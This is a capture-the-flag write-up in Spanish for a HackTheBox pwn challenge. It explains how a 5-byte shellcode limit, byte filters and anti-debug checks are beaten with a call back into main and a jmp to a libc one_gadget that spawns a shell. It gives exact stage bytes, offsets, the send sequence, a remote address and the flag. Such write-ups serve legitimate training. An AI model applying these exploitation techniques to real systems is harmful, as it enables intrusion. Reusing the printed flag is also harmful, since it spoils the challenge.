# Words from the Past: HackTheBox (Pwn / Shellcode)

**Flag:** `HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_6be05adf69ade899c97ab48015947c92}`

Remote: `154.57.164.80:32485` · glibc **2.39** (shipped) · Alpine + socat forkserver

---

## 1. Reconocimiento

Binario diminuto (stripped, PIE, Full RELRO, canary, NX). `main` (`0x16d5`) mapea
una página **RWX**, lee **exactamente 5 bytes** y salta a ellos:

```c
mmap(addr, 0x1000, PROT_RWX, flags, -1, 0);   // buffer de shellcode
n = read(0, buf, 5);
if (n <= 4) exit(1);
// cadena de anti-debug + filtros de bytes
jmp rdx;                                        // ejecuta los 5 bytes  (rdx = buf)
```

Sólo **5 bytes de shellcode**. Encima, filtros y un `buf[0]` forzado:

| Chequeo | Función | Regla |
|---------|---------|-------|
| Encoding | `0x14b1` | ningún byte `0x00` ni `0x0a` |
| Breakpoint | `0x1515` | ningún byte `0xcc` |
| Instrucción | `0x1565` | `buf[0] == 0xe8` (run 1) / `0xe9` (run 2) |

Anti-debug: forkserver, `getenv(LD_PRELOAD/LD_AUDIT)`, `/proc/self/status` →
`TracerPid`, timing con `rdtsc`, y `prctl(PR_SET_DUMPABLE, 0)` (bloquea el
ptrace/lectura de `/proc/PID/maps` del hijo). El binario ejecuta ese chequeo
*antes* del `jmp`, así que no se puede depurar el hijo directamente.

## 2. Las dos etapas del `read`

Una global (`0x5030`) alterna el buffer y el byte forzado:

- **Run 1** (`0x5030==0`): buffer con *hint* `main+0x10000`, sin `MAP_FIXED`,
  `buf[0]` debe ser **`0xe8`** (opcode de `call rel32`). Fija `0x5030=1`.
- **Run 2** (`0x5030!=0`): parsea `/proc/self/maps` → `libc_base`; mapea
  **`MAP_FIXED`** en `libc_base - ((getpid()&7)+0x1000)<<12`; `buf[0]` debe ser
  **`0xe9`** (`jmp rel32`). Fija `0x5030=2`.

Como no hay leaks, un `rel32` (relativo a rip) es la única forma de saltar
posiciones fijas. La clave del diseño:

- El **run 2** deja el buffer a un offset **constante respecto a libc**, así que
  un `jmp` alcanza cualquier símbolo de libc con `rel32` **invariante a ASLR**
  (solo `pid&7`, 3 bits, es incógnita → **fuerza bruta 1/8**).
- El **run 1** solo sirve para **re-entrar en `main`** (via `call`) y así llegar
  al run 2.

## 3. Registros en el `jmp` (obtenidos con ptrace sobre copia parcheada)

El hijo real no es depurable (`PR_SET_DUMPABLE=0`). Se parchea una copia local
**solo para análisis** (NOP a `fork`/`prctl`, `ret` en los anti-debug `0x1295`
y `0x1445`) para que sea dumpable, y con un tracer ptrace se lee el estado justo
en `jmp rdx`:

```
rax=1   rbx=0   rcx=0   rsi=0   r9=0   r13=0
rdx=buf (RWX)          rdi=libc+0x205710      r12=0xdead
rbp/rsp = frame de main   [rbp-0x78]=0
```

`r12=0xdead` y `rax=1` están puestos a propósito para **matar los one_gadgets**
de `execve` (necesitan `rax==NULL` o `r12` como envp válido). Verificando cada
uno empíricamente (poniendo `rip=libc+og` en el proceso real y mirando si sale
shell), solo sobrevive:

```
0x583f3  posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
  requiere: rsp&0xf==0 ✓, rsp+0x68 writable ✓, rcx==NULL ✓ (0), rbx==NULL ✓ (0)
```

## 4. Stage 1: re-entrar en `main`

El *hint* del run 1 (`main+0x10000`) se honra **alineado a página**, así que
`buf1 = base+0x11000` (con `main = base+0x16d5`):

```
rel = main - (buf1+5) = 0x16d5 - 0x11005 = -0xF930 = 0xFFFF06D0
STAGE1 = e8 d0 06 ff ff        # call main   (sin 0x00/0x0a/0xcc)
```

La ubicación de `buf1` es dependiente del kernel (mi WSL2 local lo pone en
`base-0x6000` → `rel` con nulls → irresoluble local). Se confirmó `buf1=base+0x11000`
en el **target** con un oráculo: enviar solo el stage 1 y contar los banners: si `main` se re-entra, imprime el arte + "[Garran Voss]" otra vez (la salida se
duplica: ~3962 → ~7839 bytes, 2 → 3 "Garran").

## 5. Stage 2: `jmp` al one_gadget

```
buf2 = libc_base - ((pid&7)+0x1000)*0x1000        (MAP_FIXED)
rel  = 0x583f3 - (buf2+5 - libc_base)
     = 0x583f3 + ((pid&7)+0x1000)*0x1000 - 5      (invariante a ASLR)
STAGE2(g) = e9 || p32(rel)                          # todos los g: sin bytes malos
```

`pid&7` es incógnita → se prueban `g = 0..7` (cada conexión re-randomiza el pid).

## 6. Cadena completa

```
send( STAGE1 + STAGE2(g) )                 # 5+5 bytes, se leen en dos read()
send( "echo ...; id; cat flag*\n" )        # lo consume el /bin/sh spawneado
```

```
uid=100(ctf) gid=101(ctf) groups=101(ctf)
HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_6be05adf69ade899c97ab48015947c92}
```

## Ficheros

- `challenge/words_from_the_past` + `challenge/glibc/`: binario y libc del reto
- `exploit.py`: exploit pwntools (`remote` para el flag; brute 1/8 de `pid&7`)
